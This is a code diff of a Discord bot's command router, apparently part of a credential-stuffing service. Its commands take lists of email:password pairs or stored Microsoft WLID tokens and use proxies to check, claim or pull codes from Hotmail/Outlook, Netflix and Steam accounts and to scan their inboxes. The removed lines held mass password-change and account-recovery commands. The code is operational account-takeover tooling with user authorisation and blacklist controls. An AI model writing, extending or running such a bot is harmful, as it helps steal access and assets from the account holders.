+  // Unauthorised → autopilot warning (only for known commands attempted by non-auth users)
+  if (!canUse(message.author.id) && !isOwner(message.author.id)) {
+    if (autopilot.isEnabled()) {
+      await maybeSendUnauthorisedWarning(message);
+      return;
+    }
+    return message.reply({ embeds: [errorEmbed("You are not authorized to use this bot.")] });
+  }
 
   try {
     if (cmd === "check") {
@@ -2039,212 +1370,82 @@ client.on("messageCreate", async (message) => {
       const attachment = message.attachments.first();
       if (!accountsRaw && !attachment) {
         const storedCount = getWlidCount();
-        const storedInfo = storedCount > 0 ? `\n\n**${storedCount} WLIDs stored** — just attach codes.txt to use them.` : "\n\nNo WLIDs stored. Use `.wlidset` first or provide WLIDs inline.";
-        return respond({ embeds: [infoEmbed("Usage", "`.check [wlid_tokens]` + attach codes.txt\n\nIf WLIDs are stored via `.wlidset`, just attach codes.\nResults are always sent to your DMs." + storedInfo)] });
+        return respond({ embeds: [infoEmbed("Usage", `\`.check [wlids]\` + attach codes.txt\nStored WLIDs: **${storedCount}**`)] });
       }
       await handleCheck(respond, message.author.id, accountsRaw, null, attachment, 10, message.author);
-    }
-
-    else if (cmd === "claim") {
+    } else if (cmd === "claim") {
       const accountsRaw = args.join(" ");
       const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.claim <accounts>`\nProvide email:password comma-separated or attach a `.txt` file.\nResults are always sent to your DMs.")] });
-      }
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.claim <accounts>` or attach a `.txt` file.")] });
       await handleClaim(respond, message.author.id, accountsRaw, attachment, 5, message.author);
-    }
-
-    else if (cmd === "pull") {
+    } else if (cmd === "pull") {
       const accountsRaw = args.join(" ");
       const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.pull <accounts>`\nProvide email:password comma-separated or attach a `.txt` file.\nResults are always sent to your DMs.")] });
-      }
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.pull <accounts>` or attach a `.txt` file.")] });
       await handlePull(respond, message.author.id, accountsRaw, attachment, message.author, message.author.username);
-    }
-
-    else if (cmd === "promopuller") {
+    } else if (cmd === "promopuller") {
       const accountsRaw = args.join(" ");
       const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.promopuller <accounts>`\nProvide email:password comma-separated or attach a `.txt` file.\nPulls promo links only. Results sent to your DMs.")] });
-      }
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.promopuller <accounts>` or attach a `.txt` file.")] });
       await handlePromoPuller(respond, message.author.id, accountsRaw, attachment, message.author, message.author.username);
-    }
-
-    else if (cmd === "inboxaio") {
+    } else if (cmd === "inboxaio") {
       const accountsRaw = args.join(" ");
       const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", `\`.inboxaio <accounts>\` or attach a .txt file\n\nScans Hotmail/Outlook inboxes for ${getServiceCount()}+ services.\nResults sent to your DMs as organized files.`)] });
-      }
-      await handleInboxAio(respond, message.author.id, accountsRaw, attachment, 5, message.author);
-    }
-
-    else if (cmd === "wlidset") {
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", `\`.inboxaio <accounts>\` or attach .txt — scans ${getServiceCount()}+ services.`)] });
+      await handleInboxAio(respond, message.author.id, accountsRaw, attachment, 3, message.author);
+    } else if (cmd === "wlidset") {
       const wlidsRaw = args.join(" ");
       const attachment = message.attachments.first();
-      if (!wlidsRaw && !attachment) {
-        const storedCount = getWlidCount();
-        return respond({ embeds: [infoEmbed("Usage", `\`.wlidset <wlid_tokens>\` or attach a .txt file\n\nReplaces all previously stored WLIDs.\n\nCurrently stored: **${storedCount}** WLIDs`)] });
-      }
+      if (!wlidsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", `\`.wlidset <wlids>\` or attach .txt\nStored: **${getWlidCount()}**`)] });
       await handleWlidSet(respond, message.author.id, wlidsRaw, attachment);
-    }
-
-    else if (cmd === "auth") {
-      if (args.length < 2) {
-        return respond({ embeds: [infoEmbed("Usage", "`.auth <@user or user_id> <duration>`\n\nDuration examples: `1h`, `7d`, `30d`, `1mo`, `forever`")] });
-      }
-      let targetId = args[0].replace(/[<@!>]/g, "");
-      const duration = args.slice(1).join(" ");
-      await handleAuth(respond, message.author.id, targetId, duration);
-    }
-
-    else if (cmd === "deauth") {
-      if (args.length < 1) {
-        return respond({ embeds: [infoEmbed("Usage", "`.deauth <@user or user_id>`")] });
-      }
-      let targetId = args[0].replace(/[<@!>]/g, "");
-      await handleDeauth(respond, message.author.id, targetId);
-    }
-
-    else if (cmd === "authlist") {
+    } else if (cmd === "auth") {
+      if (args.length < 2) return respond({ embeds: [infoEmbed("Usage", "`.auth <@user|id> <duration>` (1h, 7d, 30d, 1mo, forever)")] });
+      const targetId = args[0].replace(/[<@!>]/g, "");
+      await handleAuth(respond, message.author.id, targetId, args.slice(1).join(" "));
+    } else if (cmd === "deauth") {
+      if (args.length < 1) return respond({ embeds: [infoEmbed("Usage", "`.deauth <@user|id>`")] });
+      await handleDeauth(respond, message.author.id, args[0].replace(/[<@!>]/g, ""));
+    } else if (cmd === "authlist") {
       await handleAuthList(respond);
-    }
-
-    else if (cmd === "blacklist") {
-      if (args.length < 1) {
-        return respond({ embeds: [infoEmbed("Usage", "`.blacklist <@user or user_id> [reason]`")] });
-      }
-      let targetId = args[0].replace(/[<@!>]/g, "");
-      const reason = args.slice(1).join(" ") || "No reason";
-      await handleBlacklist(respond, message.author.id, targetId, reason);
-    }
-
-    else if (cmd === "unblacklist") {
-      if (args.length < 1) {
-        return respond({ embeds: [infoEmbed("Usage", "`.unblacklist <@user or user_id>`")] });
-      }
-      let targetId = args[0].replace(/[<@!>]/g, "");
-      await handleUnblacklist(respond, message.author.id, targetId);
-    }
-
-    else if (cmd === "blacklistshow") {
+    } else if (cmd === "blacklist") {
+      if (args.length < 1) return respond({ embeds: [infoEmbed("Usage", "`.blacklist <@user|id> [reason]`")] });
+      await handleBlacklist(respond, message.author.id, args[0].replace(/[<@!>]/g, ""), args.slice(1).join(" ") || "No reason");
+    } else if (cmd === "unblacklist") {
+      if (args.length < 1) return respond({ embeds: [infoEmbed("Usage", "`.unblacklist <@user|id>`")] });
+      await handleUnblacklist(respond, message.author.id, args[0].replace(/[<@!>]/g, ""));
+    } else if (cmd === "blacklistshow") {
       await handleBlacklistShow(respond);
-    }
-
-    else if (cmd === "stats") {
+    } else if (cmd === "stats") {
       await handleStats(respond);
-    }
-
-    else if (cmd === "purchase") {
-      const productArg = args.pop();
+    } else if (cmd === "netflix") {
       const accountsRaw = args.join(" ");
       const attachment = message.attachments.first();
-      if (!productArg && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.purchase <accounts> <product_id_or_url>`\nProvide email:password and a product ID or Microsoft Store URL.\nResults are always sent to your DMs.")] });
-      }
-      await handlePurchase(respond, message.author.id, accountsRaw, attachment, productArg, message.author);
-    }
-
-    else if (cmd === "search") {
-      const query = args.join(" ");
-      await handleSearch(respond, query);
-    }
-
-    else if (cmd === "changer") {
-      const newPassword = args.pop();
-      const accountsRaw = args.join(" ");
-      const attachment = message.attachments.first();
-      if (!newPassword && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.changer <accounts> <new_password>`\nProvide email:password accounts and the new password.\nResults are always sent to your DMs.")] });
-      }
-      await handleChanger(respond, message.author.id, accountsRaw, attachment, newPassword, 5, message.author);
-    }
-
-    else if (cmd === "checker") {
-      const accountsRaw = args.join(" ");
-      const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.checker <accounts>`\nProvide email:password accounts or attach a `.txt` file.\nResults are always sent to your DMs.")] });
-      }
-      await handleAccountChecker(respond, message.author.id, accountsRaw, attachment, 5, message.author);
-    }
-
-    else if (cmd === "netflix") {
-      const accountsRaw = args.join(" ");
-      const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.netflix <accounts>`\nProvide email:password or attach a `.txt` file.\nChecks Netflix accounts. Results sent to your DMs.")] });
-      }
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.netflix <accounts>` or attach .txt")] });
       await handleNetflix(respond, message.author.id, accountsRaw, attachment, 10, message.author);
-    }
-
-    else if (cmd === "steam") {
+    } else if (cmd === "steam") {
       const accountsRaw = args.join(" ");
       const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.steam <accounts>`\nProvide user:password or attach a `.txt` file.\nChecks Steam accounts. Results sent to your DMs.")] });
-      }
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.steam <accounts>` or attach .txt")] });
       await handleSteam(respond, message.author.id, accountsRaw, attachment, 15, message.author);
-    }
-
-    else if (cmd === "help") {
+    } else if (cmd === "help") {
       return respond({ embeds: [helpOverviewEmbed(config.PREFIX)], components: [helpSelectMenu()] });
-    }
-
-    else if (cmd === "refund") {
+    } else if (cmd === "refund") {
       const accountsRaw = args.join(" ");
       const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.refund <accounts>`\nProvide email:password or attach a `.txt` file.\nChecks refund eligibility (14-day window).\nResults are always sent to your DMs.")] });
-      }
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.refund <accounts>` or attach .txt")] });
       await handleRefund(respond, message.author.id, accountsRaw, attachment, 5, message.author, message.author.username);
-    }
-
-    else if (cmd === "rewards") {
+    } else if (cmd === "rewards") {
       const accountsRaw = args.join(" ");
       const attachment = message.attachments.first();
-      if (!accountsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.rewards <accounts>`\nProvide email:password or attach a `.txt` file.\nResults are always sent to your DMs.")] });
-      }
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.rewards <accounts>` or attach .txt")] });
       await handleRewards(respond, message.author.id, accountsRaw, attachment, 3, message.author);
-    }
-
-
-    else if (cmd === "recover") {
-      const newPassword = args.pop();
-      const emailsRaw = args.join(" ");
-      const attachment = message.attachments.first();
-      if (!emailsRaw && !attachment) {
-        return respond({ embeds: [infoEmbed("Usage", "`.recover <email(s)> <new_password>`\nProvide email(s) or attach a `.txt` file.\nResults are always sent to your DMs.")] });
-      }
-      if (!newPassword) {
-        return respond({ embeds: [errorEmbed("Provide the new password as the last argument.")] });
-      }
-      await handleRecover(respond, message.author.id, emailsRaw, attachment, newPassword, 1, message.author, null, message);
-    }
-
-    else if (cmd === "captcha") {
-      const solution = args.join(" ");
-      if (!solution) {
-        return respond({ embeds: [infoEmbed("Usage", "`.captcha <solution>`\n\nSubmit the CAPTCHA solution for an active recovery session.")] });
-      }
-      await handleCaptchaSolve(respond, message.author.id, solution);
-    }
-
-    // ── Admin commands (prefix) ──
-    else if (cmd === "admin") {
+    } else if (cmd === "admin") {
       await handleAdminPanel(respond, message.author.id);
-    }
-
-    else if (cmd === "setwebhook") {
+    } else if (cmd === "setwebhook") {
       const url = args[0];
       if (!url) return respond({ embeds: [errorEmbed("Usage: `.setwebhook <url>`")] });
       await handleSetWebhook(respond, message.author.id, url);
-    }
-
-    else if (cmd === "botstats") {
+    } else if (cmd === "botstats") {
       await handleBotStats(respond, message.author.id);
     }
   } catch (err) {
@@ -2260,36 +1461,28 @@ client.once("ready", () => {
   console.log(`Owner: ${config.OWNER_ID}`);
   console.log(`Max concurrent users: ${config.MAX_CONCURRENT_USERS}`);
   console.log(`Stored WLIDs: ${getWlidCount()}`);
-  
-  // Load proxies on startup
+  console.log(`Autopilot: ${autopilot.isEnabled() ? "ON" : "OFF"}`);
+  console.log(`Anti-link channels: ${(config.ANTILINK_CHANNELS || []).length}`);
+
   const proxyCount = loadProxies();
   console.log(`Proxies: ${config.USE_PROXIES ? `Enabled (${proxyCount} loaded)` : "Disabled"}`);
-  
-  // Dynamic rich presence — cycles through stats
+
   const presenceMessages = [
     () => ({ name: ".gg/autizmens", type: 3 }),
     () => ({ name: `${getWlidCount()} WLIDs stored`, type: 3 }),
     () => ({ name: `${auth.getAllAuthorized().length} users authorized`, type: 3 }),
     () => ({ name: `${limiter.getActiveCount()} active sessions`, type: 3 }),
-    () => {
-      const s = statsManager.getSummary();
-      return { name: `${s.total_processed} processed`, type: 3 };
-    },
     () => ({ name: ".help | .pull | .check", type: 2 }),
   ];
 
   let presenceIndex = 0;
   function cyclePresence() {
     const activity = presenceMessages[presenceIndex % presenceMessages.length]();
-    client.user.setPresence({
-      status: "online",
-      activities: [activity],
-    });
+    client.user.setPresence({ status: "online", activities: [activity] });
     presenceIndex++;
   }
-
   cyclePresence();
-  setInterval(cyclePresence, 15000); // cycle every 15 seconds
+  setInterval(cyclePresence, 15000);
 });
 
 client.login(config.BOT_TOKEN);
